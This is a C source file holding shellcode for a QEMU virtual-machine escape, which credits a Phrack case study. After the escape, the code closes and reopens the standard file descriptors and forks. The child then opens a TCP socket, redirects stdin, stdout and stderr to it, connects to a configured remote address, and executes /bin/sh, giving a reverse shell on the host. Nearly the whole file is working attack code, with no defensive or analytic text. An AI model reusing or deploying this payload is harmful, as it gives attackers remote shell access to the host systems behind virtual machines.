/* 
 * Shellcode based on Phrack article VM escape - QEMU Case Study by Mehdi Talbi & Paul Fariello 
 * http://www.phrack.org/papers/vm-escape-qemu-case-study.html
 */

#include <string.h>
#include <fcntl.h>
#include <syscall.h>
#include "shellcode.h"

void __attribute__((optimize("no-stack-protector"))) shellcode(struct payload *payload)
{
	char *args[2] = { payload->shell, NULL};

	int socket;
	struct sockaddr_in servaddr = {0};

	/* check if already executed */
	if (payload->done) return;
	payload->done = 1;

	/* fix the address of syscall */
	payload->syscall = (typeof(syscall_func) *)((uint64_t)payload + 
					offsetof(struct payload, syscall_func));

	payload->syscall(SYS_close, 0);
	payload->syscall(SYS_close, 1);
	payload->syscall(SYS_close, 2);

	payload->syscall(SYS_open, payload->tty, O_RDWR|O_NOCTTY|O_ASYNC, NULL);
	payload->syscall(SYS_open, payload->tty, O_RDWR|O_NOCTTY|O_ASYNC, NULL);
	payload->syscall(SYS_open, payload->tty, O_RDWR|O_NOCTTY|O_ASYNC, NULL);

	if (payload->syscall(SYS_fork) == 0) {
		socket = payload->syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
		payload->syscall(SYS_dup2, socket, 0);
		payload->syscall(SYS_dup2, socket, 1);
		payload->syscall(SYS_dup2, socket, 2);

		servaddr.sin_family = AF_INET;
		servaddr.sin_port = payload->config.sin_port;
		servaddr.sin_addr.s_addr = payload->config.sin_addr.s_addr;

		payload->syscall(SYS_connect, socket, &servaddr, sizeof(servaddr));
		payload->syscall(SYS_execve, payload->shell, args, NULL);
	}
} SHELLCODE(shellcode)

int create_shellcode(struct payload *payload)
{
	strcpy(payload->shell, "/bin/sh");
	strcpy(payload->tty, "/dev/tty");

	SHELLCODE_PACK(payload, shellcode);
	SHELLCODE_PACK(payload, syscall_func);

	return 0;
}

